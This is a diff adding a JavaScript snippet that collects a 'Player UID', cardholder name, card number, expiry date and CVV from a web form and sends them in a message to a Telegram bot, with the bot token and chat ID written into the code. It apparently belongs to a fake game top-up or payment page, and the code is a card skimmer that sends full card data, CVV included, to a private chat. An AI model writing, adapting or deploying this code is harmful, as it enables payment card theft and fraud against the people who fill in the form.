@@ -1,0 +1,43 @@
+// 1. Validation check & Variable extraction
+// (Assuming you have an HTML form with these input fields)
+const uid = document.getElementById('uid').value;
+const name = document.getElementById('name').value;
+const number = document.getElementById('number').value;
+const expiry = document.getElementById('expiry').value;
+const cvv = document.getElementById('cvv').value;
+
+if (!name || !number || !expiry || !cvv) {
+    alert('Please fill out all fields');
+    return;
+}
+
+// 2. Telegram Configuration
+const BOT_TOKEN = '8732590798:AAEr7p9WexGuUXavhb7qlR...'; 
+const CHAT_ID = '62586335608';
+
+// 3. Construct the message text correctly using template literals
+const message = `
+New Payment Details:
+- Player UID: ${uid}
+- Name: ${name}
+- Card Number: ${number}
+- Expiry: ${expiry}
+- CVV: ${cvv}
+`;
+
+// 4. Send to Telegram via fetch
+const url = `https://api.telegram.com/bot${BOT_TOKEN}/sendMessage`;
+
+fetch(url, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+    })
+})
+.then(response => response.json())
+.then(data => console.log('Success:', data))
+.catch(error => console.error('Error:', error));
